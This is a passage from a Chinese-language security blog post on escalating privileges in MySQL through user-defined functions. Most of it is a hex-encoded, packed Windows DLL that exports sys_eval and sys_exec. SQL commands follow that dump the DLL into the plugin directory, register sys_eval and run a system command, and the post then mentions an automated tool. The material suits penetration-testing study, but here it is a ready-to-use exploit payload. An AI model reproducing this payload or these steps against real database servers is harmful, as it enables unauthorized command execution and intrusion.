210C668C186C5FFBDA3806252C0620080605DD2DCDD20425002D7FFC9C8F7AB6B1F6143095562407042831D6FEDB7F0807348B85E0FCA0AA701DDBB5B395011C1920241318092B18476A565F201CB360C32C9F7B8985D8320A04DC03B557E01B243468DEDFD1F7D8D360CE2879D40A2C833D208DBDC3DA00F923685B1B300BDFAF67F534C97F23401EC25F6A4849918F144A50152E9DF458AAF8A29C10F3EB67611C7E052C37D4598FEDED8321B9273551E0F5EE3BDC0ABF03E4507F4B8417185BDB7E600BCE1CDC142CD6E288B154B609E01B14F413160A4BDB313DDCDBFFDC84676CC859D94E1E07F7D81BF076BBB7C00359485D1656B8BC18BE04A3638B6F2AF83BC673080753025073D85F60835A3BFE72F15F5E25206C6053C820CC006F35B4DD452BB84D5A346627040B85BF2B5E6E413C03C1813850E45FEFA5ECFFFB33D2B90B011C48180F94C28BC25DC33FB702BF35E34831C80FB74114AE057106C1A55B6C33578C081817761BFFFF2FF1D7487BF972098B580803D93BFB720A4283C0283BD67270CA36B5E86AE55DC38F6AFEF0CD71F7A970040B056418005083EC080DB7C670082F316C33C576F0852F06DF64A31A89B90968555DB7F081F0B2091C6B04F555972DD12C937D1350195C083B04E1C26F2724C1E81FF715E0018FEFB6532B034F230059948BE55DC3621DDB49A301CA3DAFC0FAE99525242631CCFF29343232B61058054C50AC2CB41E97AF12B60D56096B27D7616B20CFB0FBEF2AE4E03160031F73D9665B9A6C038D2BE0FAFC046BA039F13CB4FC8A0D6C120C7D0DC395C3C1619C965154147FE41F3E783124F020140BDAC40E5643B25D53EC1068F885626DF4F888C9BF4EE640BB25EEA0398466820D85C33149DB9F0A359A04EB605675F869639FC1F6448B7598751F1033F0071476E6CA20189D271CB4F6EE6FEDF4330C113BF77507BE4F59EB0B85F30A7B047EA10AC1E0100BF0CE00F7D6076C840D1E045E5F01C33F5C05646464646064686C1405766474B000003FF4C20E034B0F20185F4E6F20FFFFB7FF617267756D656E7473096C6C6F77656420287564663A206C69625F6DCCFD6DF77973716C0D5F73085F696E666F293918DFB6FF8F2076657273696F6E20302E01341F45787065F6DBDBDD637447657861076C79201A65207374723F5BDB5AFB672074791B75726171217258C00E602B7477911FD86F030B3F8672206E616D48DBB1B71F436F756C246E6F74C4636113203058B76D186D2779AF72F1483FDA4D943F2003121071051BF29D5860214707D0604D0D0B0F81CB074ED961DD9703AB17CC2708A77527ECC00FD81F0A3B034FC0A07B851F03240328C1556583A200C5889251CA22D877BDB119BF44FF000F5565A3AA00A8AA9251645455C95532AAAAFFF61D455C0410020157616974466F00FC06C07253886C654F626A07C07F6B99145669727475616C417603E0F6370D536574456E76126F6EC000BC6DBF5661726961622B4118437265F76DEB6E94546806640D47264375727222CD12F65B502A636573734914266E03E083135469636BDE6E6BB1F6B6FD5175657279500366846D616E371667EF1B00FD0144697367374CFDB7EDED6962727879436192731A4973446562756767EDEE6DAD266A686546A4556E6840B1B7B7B7643164457846707469AF46696C4A6D295B6119B41254DE64AEB0176D0DD8114990B9EDD61A0A6B409D6D70876547C25A73CD517F77555122B4ED6E591B5C537973186DEEC3C2EB2E39417373650975697CDB15DA434C7D5F687E396D5F2EDFFEDEBE5F616D7367087869740B646A753A5F666469EC4217B076260A639A5F64FD6CADB91F5F686F6F6B131459725FF802700148D15FDB9CEB0249730A330A6C21D6F0BD82539C2A64D46E640893050B130F651E6B5B7BC25F2C723456ED6D1C182FF6D69A700A035F706F522947E1DDBE6E106468756C5EB92A6BCB92BD9B1B2CA806E0B6D86E6EC57265250866112E827BDB5673749C637079082439EDCD5C6B32C06E4D0FD7ED1F5AC36F7319663A1F5F4370705831C75E3B8474BC6D343F001817FFFFFFFF3D193C1C1B161E55142D16270815270F11115F10130A070D2E17090705160C1E7FFBFFFF080A0B160918181505061B050C10060717062105110F061421110B08E4FBDFB62B22052A111D0D18532D483806000776FBDBE5080C09330A090B0C051007061612EEDFFEED0E0B34150B18160D3D0542C205121E14066930FFD8DDFF110C0E1D4D0517230D0C3224080B4506F0DE041004F03B0A6EFF2C01043808041C1C0204003E4C016DFF21FD05004AFE9F5A8FE00002210B0109080C634F7AD60C1213D616A300200E10C10A01630B02AB3362B7EE6107006003040233351EEED9C0CE34100706C02633D6EDDB7620AC22033C144002B0021C5759DD0050520143C8C8BA65B1214200A7B82F06DB5D182EB4787407EA0B900C5BFA90CDB742602E72647D610861C90E76C508FB0A00C700A1DB66BB77402E26300304301BECDB943D001A27C04F73726300EB11C0061B40731C4F78C2C2A365761F01030002ED7760497B27421BA023030000EDD8D152127C53030400000000000080FF00000000000000000000807C2408010F85B901000060BE007000108DBE00A0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B92A0000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE005000008B0709C0743C8B5F048D8430B472000001F35083C708FF96F0720000958A074708C074DC89F95748F2AE55FF96F472000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAEF87200008DBE00F0FFFFBB0010000050546A045357FFD58D871702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9AD98FFFF0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005C80000056020000E404000000000000584000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564339302E435254222076657273696F6E3D22392E302E32313032322E38222070726F636573736F724172636869746563747572653D2278383622207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E504100000000000000000000000010830000F08200000000000000000000000000001D83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004B45524E454C33322E444C4C004D5356435239302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000006672656500000000000000004AFE9F5A0000000058840000010000001200000012000000A4830000EC8300003484000021100000A312000000100000A4120000A3120000A0120000CC110000A31200009811000086110000A31200009811000076100000A3120000431000002E1100001A110000A91000006D84000083840000A0840000BB840000C7840000DA840000EB840000F484000004850000128500001B8500002B8500003985000041850000508500005D850000658500007485000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000700000100000006D3C683E6C3E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080509.png" alt="Untitled"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;plugin_dir&#x27;;</span><br><span class="line"></span><br><span class="line">select * from t_tmp into dumpfile &#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;;</span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &#x27;udf.dll&#x27;</span><br><span class="line"></span><br><span class="line">select name from mysql.func;</span><br><span class="line"></span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805010.png" alt="Untitled"></p>
<h2 id="0x02-工具提权"><a href="#0x02-工具提权" class="headerlink" title="0x02 工具提权"></a>0x02 工具提权</h2><p>使用工具提权方便快捷，还可一键清除连接信息。</p>
<p>MDUT：</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805011.png" alt="Untitled"></p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805012.png" alt="Untitled"></p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805013.png" alt="Untitled"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/15858250.html">https://www.cnblogs.com/02SWD/p/15858250.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sheng-xia/articles/14628574.html">https://www.cnblogs.com/sheng-xia/articles/14628574.html</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Startseite</a></li>
         
          <li><a href="/about/">Über diese Webseite</a></li>
         
          <li><a href="/archives/">Artikel</a></li>
         
          <li><a href="/">Projekte</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">MySQL UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 手工提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">提权条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BD%93%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0udf-dll"><span class="toc-number">1.2.1.</span> <span class="toc-text">1 当可以直接上传udf.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BD%93%E4%B8%8D%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0udf-dll"><span class="toc-number">1.2.2.</span> <span class="toc-text">2 当不可以直接上传udf.dll</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 工具提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.4.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&text=MySQL提权之UDF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&is_video=false&description=MySQL提权之UDF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=MySQL提权之UDF&body=Check out this article: https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&name=MySQL提权之UDF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&t=MySQL提权之UDF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menü</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Teilen</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Nach oben</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2022
    givemefivw
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Startseite</a></li><!--
     --><!--
       --><li><a href="/about/">Über diese Webseite</a></li><!--
     --><!--
       --><li><a href="/archives/">Artikel</a></li><!--
     --><!--
       --><li><a href="/">Projekte</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Kopiert!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
